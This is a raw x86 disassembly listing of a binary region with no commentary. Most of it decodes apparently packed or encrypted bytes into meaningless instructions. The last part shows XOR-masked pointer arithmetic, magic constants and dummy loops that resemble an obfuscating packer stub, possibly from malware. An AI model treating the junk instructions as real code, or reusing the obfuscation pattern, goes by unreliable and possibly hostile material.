  418af6:	mov    al,0x4d
  418af8:	ja     0x418b60
  418afa:	in     al,0xfe
  418afc:	xchg   ebx,eax
  418afd:	dec    ebx
  418afe:	pop    edi
  418aff:	and    eax,0xd846e56b
  418b04:	imul   ebx,edx,0x6a7a9e38
  418b0a:	shr    BYTE PTR [edi],cl
  418b0c:	add    BYTE PTR [esi-0x3c],0x44
  418b10:	adc    ch,dh
  418b12:	div    ecx
  418b14:	sbb    ebx,DWORD PTR [ecx-0x61]
  418b17:	dec    ebx
  418b18:	xor    edi,DWORD PTR [edi+0x1f]
  418b1b:	retf   
  418b1c:	mov    edx,0xe06a2afa
  418b21:	push   esp
  418b22:	mov    BYTE PTR [ebx],dl
  418b24:	fcom   st(0)
  418b26:	jb     0x418b33
  418b28:	cmp    DWORD PTR [edx+ebp*4],esi
  418b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b2c:	nop
  418b2d:	adc    ecx,DWORD PTR [ebp-0x2bf62540]
  418b33:	or     edi,DWORD PTR [edx+0x5c]
  418b36:	or     eax,0x8963f5f
  418b3b:	add    eax,0x5b350c2c
  418b40:	sub    eax,0x543a5bf2
  418b45:	sub    al,0xd7
  418b47:	mov    edx,0x63ea127a
  418b4c:	mov    WORD PTR [esi+ebx*8+0x31],ds
  418b50:	iret   
  418b51:	xchg   esp,eax
  418b52:	mov    edx,0xc284a016
  418b57:	iret   
  418b58:	mov    ds:0x463b0417,eax
  418b5d:	and    BYTE PTR [edx-0x5b],ah
  418b60:	(bad)  
  418b61:	enter  0x4b9,0xff
  418b65:	xchg   DWORD PTR [edx+ebx*2+0x45],esi
  418b69:	retf   0xd737
  418b6c:	stos   DWORD PTR es:[edi],eax
  418b6d:	test   eax,0x8778828e
  418b72:	(bad)  
  418b73:	fstp   TBYTE PTR [ebx+0x4f6a38fb]
  418b79:	inc    edi
  418b7a:	repnz nop
  418b7c:	out    0x1d,eax
  418b7e:	push   eax
  418b7f:	icebp  
  418b80:	dec    ebp
  418b81:	mov    dh,0x66
  418b83:	retf   0x818b
  418b86:	mov    ch,0x2d
  418b88:	inc    edi
  418b89:	jnp    0x418ba9
  418b8b:	loop   0x418bcd
  418b8d:	xchg   eax,edi
  418b8f:	les    edi,FWORD PTR ds:0x83a756f0
  418b95:	push   edx
  418b96:	mov    bl,0xb4
  418b98:	jg     0x418b24
  418b9a:	(bad)  
  418b9b:	cwde   
  418b9c:	popf   
  418b9d:	adc    eax,0x8e1dbb75
  418ba2:	jnp    0x418b28
  418ba4:	hlt    
  418ba5:	xor    eax,0xcfd2b344
  418baa:	jle    0x418bcf
  418bac:	dec    edi
  418bad:	repnz cmp edx,esi
  418bb0:	xchg   edx,eax
  418bb1:	xchg   ecx,eax
  418bb2:	mov    WORD PTR [ebx+0x6feb1dfd],gs
  418bb8:	jo     0x418b79
  418bba:	sub    al,0x48
  418bbc:	xchg   BYTE PTR [edi+0x6214e904],bl
  418bc2:	fsubr  st(1),st
  418bc4:	into   
  418bc5:	xchg   esi,eax
  418bc6:	sub    eax,0xb1358738
  418bcb:	push   ss
  418bcc:	or     ah,dh
  418bce:	dec    edi
  418bcf:	mov    esi,0xf95b5efa
  418bd4:	lods   eax,DWORD PTR ds:[esi]
  418bd5:	mov    eax,ds:0xcfccc472
  418bda:	lods   al,BYTE PTR ds:[esi]
  418bdb:	mov    ecx,0x3ece279a
  418be0:	add    al,0xb0
  418be2:	pop    ds
  418be3:	xor    DWORD PTR [edi],edx
  418be5:	jno    0x418b6b
  418be7:	call   0xd43c:0x75a31e4
  418bee:	icebp  
  418bef:	mov    bh,0x84
  418bf1:	and    edx,DWORD PTR [bp+di-0x2bbe]
  418bf6:	push   0x30722dd3
  418bfb:	lahf   
  418bfc:	xlat   BYTE PTR ds:[ebx]
  418bfd:	sti    
  418bfe:	leave  
  418bff:	lahf   
  418c00:	pop    esp
  418c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c02:	mov    ebp,es
  418c04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c05:	jl     0x418bdc
  418c07:	fld    QWORD PTR [edx+0x4]
  418c0a:	fucom  st(6)
  418c0c:	fsub   QWORD PTR [ebx]
  418c0e:	sbb    edi,DWORD PTR [eax]
  418c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c12:	popf   
  418c13:	mov    esp,fs
  418c15:	fidivr DWORD PTR [edi+0x47b2ba45]
  418c1b:	inc    ecx
  418c1c:	retf   0x8648
  418c1f:	pop    ecx
  418c20:	fadd   DWORD PTR [eax-0x7f]
  418c23:	cmp    bh,BYTE PTR ds:0x8cca79d9
  418c29:	aas    
  418c2a:	pop    ebx
  418c2b:	or     eax,DWORD PTR [esi-0x26b79ec6]
  418c31:	jae    0x418c66
  418c33:	imul   ecx,ebx,0x972c2163
  418c39:	and    al,0xc4
  418c3b:	mov    eax,ds:0xc618a574
  418c40:	push   eax
  418c41:	lods   al,BYTE PTR ds:[esi]
  418c42:	inc    ecx
  418c43:	pop    es
  418c44:	or     eax,eax
  418c46:	int3   
  418c47:	sub    al,ch
  418c49:	outs   dx,DWORD PTR ds:[esi]
  418c4a:	mov    edx,0xfaedfeca
  418c4f:	fcomp  QWORD PTR [eax]
  418c51:	lds    ecx,FWORD PTR [eax+0x13]
  418c54:	and    ebp,esp
  418c56:	lods   eax,DWORD PTR ds:[esi]
  418c57:	aam    0xa8
  418c59:	test   eax,0x187ff8ec
  418c5e:	xor    dl,BYTE PTR [ebp-0x4d]
  418c61:	sbb    al,0x98
  418c63:	out    dx,eax
  418c64:	jl     0x418ca0
  418c66:	aam    0x4b
  418c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c69:	iret   
  418c6a:	daa    
  418c6b:	jmp    0x6d62:0x8c632129
  418c72:	int    0xe3
  418c74:	jns    0x418c88
  418c76:	jb     0x418cd5
  418c78:	add    al,0x37
  418c7a:	je     0x418c74
  418c7c:	repz mov esi,0x12d8a828
  418c82:	pop    esi
  418c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c84:	sub    BYTE PTR [ebx],cl
  418c86:	out    0x8c,al
  418c88:	in     al,dx
  418c89:	and    eax,0xaa3a10eb
  418c8e:	jne    0x418cef
  418c90:	mov    dh,BYTE PTR [ebx+0x71ada8a1]
  418c96:	push   ebp
  418c97:	(bad)  
  418c98:	mov    esp,0x8b2a390b
  418c9d:	fcom   st(7)
  418c9f:	xchg   esi,eax
  418ca0:	xchg   ebp,eax
  418ca1:	std    
  418ca2:	pop    ebx
  418ca3:	xor    ah,BYTE PTR [ecx-0x511c5ec9]
  418ca9:	mov    ds:0x2e0f3494,eax
  418cae:	daa    
  418caf:	aam    0xc7
  418cb1:	and    eax,0x29a1a034
  418cb6:	xor    dh,BYTE PTR [esi]
  418cb8:	fadd   st,st(0)
  418cba:	int3   
  418cbb:	pusha  
  418cbc:	add    DWORD PTR [edx-0x510209f1],0x6e
  418cc3:	pop    ecx
  418cc4:	iret   
  418cc5:	in     al,0x8c
  418cc7:	sub    DWORD PTR [edi+esi*8-0x3ecabd8d],ebp
  418cce:	and    DWORD PTR [esi+ecx*4+0xd],eax
  418cd2:	sbb    al,0x60
  418cd4:	mov    ch,0xe
  418cd6:	jp     0x418ce1
  418cd8:	cli    
  418cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cda:	jmp    0x418cdc
  418cdc:	psllw  mm2,mm0
  418cdf:	cld    
  418ce0:	shl    BYTE PTR gs:[edi*8+0x6bb002bc],1
  418ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ce9:	lahf   
  418cea:	ficom  DWORD PTR [esi-0x3bf3aa03]
  418cf0:	pop    es
  418cf1:	jnp    0x418ceb
  418cf3:	sbb    eax,0x8bebe716
  418cf8:	mov    dl,0x8e
  418cfa:	jno    0x418d25
  418cfc:	and    dh,BYTE PTR [ebp+0x6047db03]
  418d02:	xchg   edx,eax
  418d03:	mov    al,BYTE PTR [esp+ebp*1-0x24]
  418d07:	xor    ch,al
  418d09:	or     esi,DWORD PTR [ecx-0x67]
  418d0c:	out    0xd5,eax
  418d0e:	push   ebp
  418d0f:	rol    DWORD PTR [ebx],0x84
  418d12:	add    BYTE PTR [ebx-0x20],ch
  418d15:	outs   dx,BYTE PTR ds:[esi]
  418d16:	repz stc 
  418d18:	or     cl,cl
  418d1a:	push   ss
  418d1b:	lods   al,BYTE PTR ds:[esi]
  418d1c:	mov    cl,BYTE PTR [esi-0x2880f0da]
  418d22:	xor    edx,edx
  418d24:	js     0x418d9f
  418d26:	and    edx,eax
  418d28:	jo     0x418da8
  418d2a:	sbb    DWORD PTR [edi],ebp
  418d2c:	icebp  
  418d2d:	xor    BYTE PTR [eax+0x4ddd0e18],al
  418d33:	add    esp,ecx
  418d35:	jecxz  0x418cc0
  418d37:	mov    bh,0xb6
  418d39:	dec    esp
  418d3a:	scas   al,BYTE PTR es:[edi]
  418d3b:	call   0x9111:0xb9d0fe05
  418d42:	ret    
  418d43:	push   ebx
  418d44:	out    0xc7,al
  418d46:	add    esp,DWORD PTR [ecx]
  418d48:	js     0x418d0f
  418d4a:	not    DWORD PTR [ebp+ecx*1-0x6e]
  418d4e:	mov    ds:0x79b181d3,eax
  418d53:	test   al,0x98
  418d55:	and    al,BYTE PTR [ecx+0x2]
  418d58:	and    eax,0x9ec87629
  418d5d:	jns    0x418cfe
  418d5f:	ficom  WORD PTR [ebp+0x3a1d87c4]
  418d65:	test   DWORD PTR [ecx+0x52],esp
  418d68:	jecxz  0x418dd1
  418d6a:	(bad)  
  418d6b:	cmc    
  418d6c:	xchg   edx,eax
  418d6d:	rcl    DWORD PTR [esi],cl
  418d6f:	jg     0x418dd3
  418d71:	pop    ebx
  418d72:	xchg   edx,eax
  418d73:	mov    ds,WORD PTR [ebx+ebp*4-0x4e]
  418d77:	dec    DWORD PTR [edx+0x66]
  418d7a:	rol    eax,cl
  418d7c:	sbb    BYTE PTR [esi],ah
  418d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d7f:	sbb    dh,dh
  418d81:	xor    al,0xfb
  418d83:	ins    BYTE PTR es:[edi],dx
  418d84:	jo     0x418dab
  418d86:	fsub   st(3),st
  418d88:	(bad)  
  418d89:	lods   al,BYTE PTR ds:[esi]
  418d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d8b:	jne    0x418d22
  418d8d:	xor    eax,0x95ae66ec
  418d92:	dec    ah
  418d94:	cmp    dl,BYTE PTR [eax]
  418d96:	mov    ebp,0x8d6dd332
  418d9b:	lods   al,BYTE PTR ds:[esi]
  418d9c:	daa    
  418d9d:	fsubr  st(4),st
  418d9f:	cmp    DWORD PTR [ebp+0x779aee8c],esi
  418da5:	in     eax,dx
  418da6:	sub    BYTE PTR [esi-0x5b],0x93
  418daa:	cmp    BYTE PTR [eax],dh
  418dac:	out    dx,al
  418dad:	gs out 0xa4,eax
  418db0:	add    cl,BYTE PTR [ebp-0x35]
  418db3:	or     esi,DWORD PTR [ebp-0x11]
  418db6:	aas    
  418db7:	or     dh,BYTE PTR [eax]
  418db9:	stos   DWORD PTR es:[edi],eax
  418dba:	mov    ebp,0x5ca7e951
  418dbf:	iret   
  418dc0:	mov    ds:0x3fce835b,al
  418dc5:	pop    ebp
  418dc6:	push   esp
  418dc7:	adc    ecx,eax
  418dc9:	sub    al,0x38
  418dcb:	retf   
  418dcc:	sub    BYTE PTR [ebx+0xa],bh
  418dcf:	add    bl,dh
  418dd1:	gs call 0xb720:0x91ecf4ac
  418dd9:	add    al,0xb1
  418ddb:	dec    esi
  418ddc:	ror    DWORD PTR [edx],0x21
  418ddf:	push   ds
  418de0:	or     BYTE PTR [edx+0x49002f5a],0x3c
  418de7:	ds push ebp
  418de9:	xor    BYTE PTR [ebx+0x14e8107d],bl
  418def:	mov    eax,ds:0x7d57390a
  418df4:	adc    eax,0x56a2f1c3
  418df9:	arpl   di,dx
  418dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dfc:	dec    esp
  418dfd:	imul   ecx,DWORD PTR [edx],0x74e52db5
  418e03:	xchg   edi,eax
  418e04:	adc    dh,BYTE PTR [esi-0x48303673]
  418e0a:	ss dec esi
  418e0c:	ins    DWORD PTR es:[edi],dx
  418e0d:	jecxz  0x418db9
  418e0f:	test   edx,eax
  418e11:	data16 fadd DWORD PTR [ebx-0x3]
  418e15:	adc    BYTE PTR [ebp-0x111157a4],0x66
  418e1c:	mov    esi,0x8163208c
  418e21:	pusha  
  418e22:	imul   esi,DWORD PTR es:[ebp+0x2b11878d],0x6520079f
  418e2d:	inc    esp
  418e2e:	cmp    dl,bh
  418e30:	test   DWORD PTR [edx-0x3cc00cc1],edx
  418e36:	xor    edi,ebx
  418e38:	xor    eax,0xc3bd08cc
  418e3d:	mov    ecx,esp
  418e3f:	jge    0x418eab
  418e41:	dec    eax
  418e42:	stos   DWORD PTR es:[edi],eax
  418e43:	lds    esp,FWORD PTR [ebp-0x1]
  418e46:	out    dx,eax
  418e47:	xor    ch,al
  418e49:	lods   al,BYTE PTR ds:[esi]
  418e4a:	jnp    0x418dfb
  418e4c:	adc    ah,BYTE PTR [eax]
  418e4e:	popf   
  418e4f:	outs   dx,BYTE PTR ds:[esi]
  418e50:	ds std 
  418e52:	sub    eax,0xa2ab36ee
  418e57:	lods   eax,DWORD PTR ds:[esi]
  418e58:	retf   
  418e59:	bound  edx,QWORD PTR [edi+eax*8]
  418e5c:	popa   
  418e5d:	or     ebp,DWORD PTR [ebp-0x1]
  418e60:	adc    dh,BYTE PTR [edx+0x211b08e1]
  418e66:	mov    gs,esp
  418e68:	sub    eax,0xe1d8323a
  418e6d:	push   0xffffffeb
  418e6f:	or     al,0x54
  418e71:	sbb    cl,BYTE PTR [ecx]
  418e73:	mov    esi,0xef89b6fa
  418e78:	push   esp
  418e79:	(bad)  
  418e7b:	in     al,0xb3
  418e7d:	rol    BYTE PTR [ebx-0x5d],cl
  418e80:	shl    DWORD PTR [ebp-0x71],cl
  418e83:	jle    0x418e70
  418e85:	retf   
  418e86:	sub    DWORD PTR [edx+0x7],0xbe06045a
  418e8d:	mov    ds:0x467b7af7,al
  418e92:	xchg   ecx,eax
  418e93:	pop    edi
  418e94:	fisub  DWORD PTR [eax]
  418e96:	adc    dh,0x8a
  418e99:	imul   eax,DWORD PTR [edi+esi*2-0x22],0xffffff97
  418e9e:	push   edx
  418e9f:	mov    BYTE PTR [ebx-0x748a205d],ch
  418ea5:	jne    0x418e85
  418ea7:	and    cl,BYTE PTR [edi]
  418ea9:	add    al,0xf7
  418eab:	das    
  418eac:	enter  0x5ae6,0x9a
  418eb0:	xor    BYTE PTR [esi],cl
  418eb2:	test   eax,0xbf43f3c3
  418eb7:	push   eax
  418eb8:	jle    0x418e6d
  418eba:	sub    al,0xc0
  418ebc:	test   BYTE PTR [eax+0x6f5986b],dl
  418ec2:	cmp    bl,ch
  418ec4:	retf   0xa37b
  418ec7:	push   esp
  418ec8:	clc    
  418ec9:	pop    edx
  418eca:	sub    BYTE PTR [ebx-0x37],cl
  418ecd:	mov    dh,0xf5
  418ecf:	scas   al,BYTE PTR es:[edi]
  418ed0:	mov    DWORD PTR ds:0xc925d048,eax
  418ed6:	inc    esp
  418ed7:	int3   
  418ed8:	lods   al,BYTE PTR ds:[esi]
  418ed9:	repnz ror esi,1
  418edc:	cmp    BYTE PTR [edi-0x6b008ba0],0xd3
  418ee3:	cmp    eax,0x8711e33
  418ee8:	scas   al,BYTE PTR es:[edi]
  418ee9:	mov    cl,0x5a
  418eeb:	inc    ecx
  418eec:	mov    al,ds:0xed718888
  418ef1:	mov    cl,0xdc
  418ef3:	xor    BYTE PTR [ebp+0x3b],bl
  418ef6:	mov    ah,0xf1
  418ef8:	jle    0x418e7f
  418efa:	das    
  418efb:	test   esi,ebx
  418efd:	dec    edx
  418efe:	cli    
  418eff:	pop    ebp
  418f00:	icebp  
  418f01:	inc    eax
  418f02:	add    DWORD PTR [edi-0xf],esp
  418f05:	mov    bl,0x8
  418f07:	sub    DWORD PTR [esi],ebx
  418f09:	mov    edi,0xd5c26091
  418f0e:	push   cs
  418f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f10:	fld    DWORD PTR [ebp-0x213de430]
  418f16:	cmp    al,0x20
  418f18:	xor    BYTE PTR [esp+ebx*1-0x18a520d5],dl
  418f1f:	push   edi
  418f20:	cmp    ebp,DWORD PTR [edi+esi*2+0x9536b43]
  418f27:	iret   
  418f28:	stc    
  418f29:	in     al,dx
  418f2a:	add    esi,ecx
  418f2c:	mov    ds:0x4214f454,eax
  418f31:	xor    eax,0x271b61d8
  418f36:	fs inc esi
  418f38:	or     al,0xa7
  418f3a:	jmp    0x817c401c
  418f3f:	add    esi,esi
  418f41:	test   eax,0x1d85f407
  418f46:	mov    dh,0x67
  418f48:	int    0xc4
  418f4a:	repnz popa 
  418f4c:	es pop esi
  418f4e:	dec    esi
  418f4f:	add    BYTE PTR [eax+esi*1],cl
  418f52:	cmp    al,0x4c
  418f54:	sbb    DWORD PTR [edi+ebx*4+0x55],edx
  418f58:	or     dh,dl
  418f5a:	fisttp DWORD PTR [ebx]
  418f5c:	xchg   edi,eax
  418f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f5e:	and    edx,DWORD PTR [ecx-0x2af3a8c6]
  418f64:	int3   
  418f65:	jno    0x418f03
  418f67:	ja     0x418f53
  418f69:	cmp    esi,DWORD PTR [ebp+0x77d9dce6]
  418f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f70:	test   al,0xb5
  418f72:	je     0x418f82
  418f74:	ret    0x619e
  418f77:	retf   0x6ad5
  418f7a:	test   eax,0x672216fd
  418f7f:	in     al,dx
  418f80:	mov    al,0xdc
  418f82:	sbb    al,BYTE PTR [esi-0x71]
  418f85:	and    ecx,ecx
  418f87:	push   esp
  418f88:	sub    eax,0x19d0a608
  418f8d:	lea    ebx,[edx+0x2b2812b2]
  418f93:	inc    esp
  418f94:	add    BYTE PTR [eax+edi*4+0x425b4d35],bl
  418f9b:	xor    al,0x69
  418f9d:	jp     0x418f86
  418f9f:	int    0xa6
  418fa1:	mov    ah,0xdc
  418fa3:	ret    
  418fa4:	add    al,0x44
  418fa6:	(bad)  
  418fa7:	pop    eax
  418fa8:	lods   al,BYTE PTR ds:[esi]
  418fa9:	aad    0x15
  418fab:	xchg   esi,eax
  418fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fad:	xor    DWORD PTR [ebp+0x7],esi
  418fb0:	xchg   ebx,eax
  418fb1:	cli    
  418fb2:	jl     0x418faf
  418fb4:	inc    ebx
  418fb5:	mov    ebx,0xfd3ac92b
  418fba:	int3   
  418fbb:	push   esp
  418fbc:	adc    al,0x6e
  418fbe:	inc    ecx
  418fbf:	enter  0x7dda,0xe2
  418fc3:	lods   al,BYTE PTR ds:[esi]
  418fc4:	cmc    
  418fc5:	jle    0x418f63
  418fc7:	jle    0x418f5c
  418fc9:	scas   eax,DWORD PTR es:[edi]
  418fca:	enter  0x4ff6,0x6b
  418fce:	shl    BYTE PTR [ebp-0x58e92016],0x49
  418fd5:	dec    ebp
  418fd6:	and    dl,0xcf
  418fd9:	sub    ecx,DWORD PTR [ebx-0x273ce391]
  418fdf:	test   al,0x2d
  418fe1:	sbb    al,0x6a
  418fe3:	xor    al,BYTE PTR [esi]
  418fe5:	pushf  
  418fe6:	push   esp
  418fe7:	ja     0x418fab
  418fe9:	call   0xf9647e06
  418fee:	dec    ebp
  418fef:	lock pop eax
  418ff1:	(bad)  
  418ff2:	adc    dl,BYTE PTR [edi-0x7b00a442]
  418ff8:	fdivr  QWORD PTR [ecx-0x23]
  418ffb:	jle    0x41905f
  418ffd:	nop
  418ffe:	adc    DWORD PTR [ecx+0x67],edi
  419001:	scas   eax,DWORD PTR es:[edi]
  419002:	fld    QWORD PTR [ebx]
  419004:	push   eax
  419005:	xor    ebx,ebp
  419007:	arpl   WORD PTR [esp+ebx*1],ax
  41900a:	jnp    0x418fee
  41900c:	inc    ecx
  41900d:	fistp  QWORD PTR [eax-0x6594874c]
  419013:	push   esi
  419014:	clc    
  419015:	in     al,0xe3
  419017:	inc    ebp
  419018:	test   eax,0xee641620
  41901d:	daa    
  41901e:	jns    0x419034
  419020:	cdq    
  419021:	sub    BYTE PTR [edi],0xd3
  419024:	and    BYTE PTR [edi],0x5
  419027:	arpl   WORD PTR [ecx+0x50f06586],dx
  41902d:	rcr    DWORD PTR [ebp+0x55],cl
  419030:	xlat   BYTE PTR fs:[ebx]
  419032:	imul   edi,ebp,0xeeff13
  419038:	lock or al,0xf6
  41903b:	out    0xb9,al
  41903d:	jle    0x418ff1
  41903f:	adc    al,0x3
  419041:	mov    bh,0x85
  419043:	inc    edi
  419044:	aad    0x63
  419046:	push   esi
  419047:	and    cl,BYTE PTR [ecx-0x44]
  41904a:	pop    ebx
  41904b:	xchg   esi,eax
  41904c:	clc    
  41904d:	cld    
  41904e:	out    dx,eax
  41904f:	sbb    eax,0x5760864d
  419054:	daa    
  419055:	pop    ecx
  419056:	xor    ah,dl
  419058:	mov    bh,0x88
  41905a:	and    esi,DWORD PTR [ebx]
  41905c:	push   ecx
  41905d:	ins    DWORD PTR es:[edi],dx
  41905e:	call   0xf90ac4fa
  419063:	mov    edi,0xb0d222b6
  419068:	and    ecx,edi
  41906a:	and    cl,0xf9
  41906d:	sub    ebp,edx
  41906f:	leave  
  419070:	in     al,dx
  419071:	xchg   ebx,eax
  419072:	arpl   WORD PTR [edx],bx
  419074:	mov    eax,0x46e5c97b
  419079:	sub    cl,BYTE PTR [ecx-0x6299e44c]
  41907f:	mov    ebp,0xd95c68ed
  419084:	inc    ebx
  419085:	out    dx,al
  419086:	fidiv  DWORD PTR [eax]
  419088:	call   0x47d9:0x91beea97
  41908f:	jae    0x419033
  419091:	add    BYTE PTR [edi-0x5eb943d1],bh
  419097:	je     0x4190c7
  419099:	scas   al,BYTE PTR es:[edi]
  41909a:	mul    BYTE PTR [ecx+edi*8-0x7b5d7d61]
  4190a1:	stc    
  4190a2:	push   ecx
  4190a3:	fild   WORD PTR [edx]
  4190a5:	loopne 0x419107
  4190a7:	bound  edi,QWORD PTR [edi-0x4aade803]
  4190ad:	in     eax,dx
  4190ae:	pop    ds
  4190af:	js     0x4190aa
  4190b1:	pop    esi
  4190b2:	rol    DWORD PTR [edx],1
  4190b4:	dec    DWORD PTR [ebx-0x80]
  4190b7:	or     eax,ebx
  4190b9:	sbb    DWORD PTR [ebp+0x2a],ecx
  4190bc:	stc    
  4190bd:	cmp    ebx,DWORD PTR [eax+esi*2]
  4190c0:	retf   
  4190c1:	push   ds
  4190c2:	repnz daa 
  4190c4:	sbb    DWORD PTR [ebx-0x73047b93],edi
  4190ca:	pop    edx
  4190cb:	mov    cl,0xe3
  4190cd:	test   al,0x11
  4190cf:	inc    eax
  4190d0:	call   0xaf4f935f
  4190d5:	je     0x419057
  4190d7:	mov    BYTE PTR [ecx],0xf6
  4190da:	imul   esp,eax,0xf4d87065
  4190e0:	pusha  
  4190e1:	popa   
  4190e2:	rcl    DWORD PTR [edi],1
  4190e4:	lock dec eax
  4190e6:	xor    esp,ecx
  4190e8:	lea    esi,[eax]
  4190ea:	scas   al,BYTE PTR es:[edi]
  4190eb:	xchg   ebp,eax
  4190ec:	xchg   BYTE PTR [edx+0x3c],ch
  4190ef:	inc    ecx
  4190f0:	mov    edi,0x10f68d32
  4190f5:	lea    esi,[edi+0x7742f76d]
  4190fb:	push   ds
  4190fc:	jp     0x419179
  4190fe:	bnd ret 0xe816
  419102:	mov    ch,0xad
  419105:	jno    0x419128
  419107:	fild   WORD PTR [esi-0x73b353cb]
  41910d:	mov    cl,al
  41910f:	cmp    eax,0x840d5a8b
  419114:	mov    edi,0x845ab5f1
  419119:	push   0xffffffeb
  41911b:	cld    
  41911c:	sbb    ch,BYTE PTR [eax+0x4039e60a]
  419122:	hlt    
  419123:	mov    ah,0x1e
  419125:	js     0x4190bf
  419127:	dec    ebp
  419128:	rdmsr  
  41912a:	aad    0xa3
  41912c:	ds faddp st(5),st
  41912f:	call   0x4b49:0x7b00334
  419136:	xor    BYTE PTR [edx+0x24],bh
  419139:	je     0x4191b2
  41913b:	and    dh,BYTE PTR [esi+0x3275d2d5]
  419141:	std    
  419142:	mov    bh,0x9e
  419144:	dec    eax
  419145:	sbb    BYTE PTR [esi-0x78e51fdc],al
  41914b:	dec    ecx
  41914c:	and    DWORD PTR [esp-0x7ba8310d],0x2a
  419154:	inc    BYTE PTR [ebx]
  419156:	jmp    0xc2958ac0
  41915b:	repnz or eax,0x5c476ad0
  419161:	gs fdivr QWORD PTR es:[ecx+0x2f]
  419166:	cli    
  419167:	cmp    DWORD PTR ds:0x267ec7a4,edx
  41916d:	ds leave 
  41916f:	fisub  DWORD PTR [eax]
  419171:	add    al,0x10
  419173:	ja     0x419175
  419175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419176:	test   DWORD PTR ds:0xfd291898,0x54aad34b
  419180:	fiadd  DWORD PTR [ecx-0xccef6ed]
  419186:	xlat   BYTE PTR ds:[ebx]
  419187:	ins    BYTE PTR es:[edi],dx
  419188:	nop
  419189:	dec    esi
  41918a:	dec    esp
  41918b:	push   edi
  41918c:	imul   edx,DWORD PTR [ebp+ebx*4-0x6c],0x19
  419191:	ins    DWORD PTR es:[edi],dx
  419192:	jmp    0xdece72d
  419197:	or     BYTE PTR [edx+ecx*2-0x2c],ah
  41919b:	cmc    
  41919c:	popf   
  41919d:	retf   0x2415
  4191a0:	popa   
  4191a1:	mov    eax,0x2dd95942
  4191a6:	add    al,0x65
  4191a8:	sahf   
  4191a9:	dec    ecx
  4191aa:	push   edx
  4191ab:	sbb    eax,0x62869b0c
  4191b0:	push   ds
  4191b1:	ret    0x273d
  4191b4:	hlt    
  4191b5:	fwait
  4191b6:	xchg   edx,eax
  4191b7:	sub    BYTE PTR [eax],bh
  4191b9:	scas   al,BYTE PTR es:[edi]
  4191ba:	in     eax,0x8b
  4191bc:	inc    ebp
  4191bd:	call   0x3431e74d
  4191c2:	(bad)  
  4191c3:	lea    eax,[eax+edx*1+0x3272db]
  4191ca:	mov    DWORD PTR [ebp-0x10],eax
  4191cd:	jmp    0x40deb0
  4191d2:	mov    eax,DWORD PTR [ebp-0x34]
  4191d5:	mov    edx,DWORD PTR [ebp+0xc]
  4191d8:	xor    edx,esi
  4191da:	lea    ecx,[ecx+edx*1+0x3272db]
  4191e1:	lea    edx,[ecx-0x3272db]
  4191e7:	xor    edx,esi
  4191e9:	cmp    edx,0xf89c95b6
  4191ef:	jne    0x40dd2f
  4191f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4191f8:	mov    edx,DWORD PTR [ebp+0xc]
  4191fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4191fe:	xor    edx,esi
  419200:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  419207:	xor    ecx,esi
  419209:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  419210:	xor    ebx,esi
  419212:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  419219:	mov    edx,DWORD PTR [ebp+0xc]
  41921c:	xor    edx,esi
  41921e:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  419225:	mov    eax,DWORD PTR [ebp+0xc]
  419228:	xor    eax,esi
  41922a:	add    eax,edi
  41922c:	pop    edi
  41922d:	pop    esi
  41922e:	pop    ebx
  41922f:	leave  
  419230:	ret    0x8
  419233:	push   ebp
  419234:	mov    ebp,esp
  419236:	mov    DWORD PTR ds:0x421a62,0xf89c85b5
  419240:	pop    ebp
  419241:	jmp    0x4193b5
  419246:	push   ebp
  419247:	mov    ebp,esp
  419249:	push   ecx
  41924a:	and    DWORD PTR ds:0x42c010,0x0
  419254:	jmp    0x419266
  419259:	mov    edx,DWORD PTR ds:0x42c010
  41925f:	inc    edx
  419260:	mov    DWORD PTR ds:0x42c010,edx
  419266:	cmp    DWORD PTR ds:0x42c010,0x19
  41926d:	jae    0x4192ae
  419273:	cmp    DWORD PTR ds:0x42c010,0x9
  41927a:	jne    0x419289
  419280:	push   DWORD PTR [ebp-0x18]
  419283:	call   DWORD PTR ds:0x42401c
  419289:	cmp    DWORD PTR ds:0x42c010,0x8
  419290:	jne    0x4192a3
  419296:	mov    edx,DWORD PTR ds:0x42c010
  41929c:	inc    edx
  41929d:	mov    DWORD PTR ds:0x42c010,edx
  4192a3:	jmp    0x419259
  4192a8:	or     DWORD PTR ds:0x42c004,ebx
  4192ae:	push   ecx
  4192af:	movzx  eax,BYTE PTR ds:0x42b00c
  4192b6:	and    DWORD PTR ds:0x42a01c,eax
  4192bc:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  4192c3:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4192ca:	mov    DWORD PTR ds:0x428008,0x13
  4192d4:	cmp    DWORD PTR ds:0x428008,0x0
  4192db:	je     0x41930a
  4192e1:	cmp    DWORD PTR ds:0x428008,0x20
  4192e8:	jne    0x4192fa
  4192ee:	push   DWORD PTR [ebp-0x14]
  4192f1:	push   DWORD PTR [ebp-0x1c]
  4192f4:	call   DWORD PTR ds:0x424020
  4192fa:	mov    eax,ds:0x428008
  4192ff:	dec    eax
  419300:	mov    ds:0x428008,eax
  419305:	jmp    0x4192d4
  41930a:	mov    eax,DWORD PTR [ebp-0x4]
  41930d:	and    DWORD PTR ds:0x429008,0x428020
  419317:	push   esi
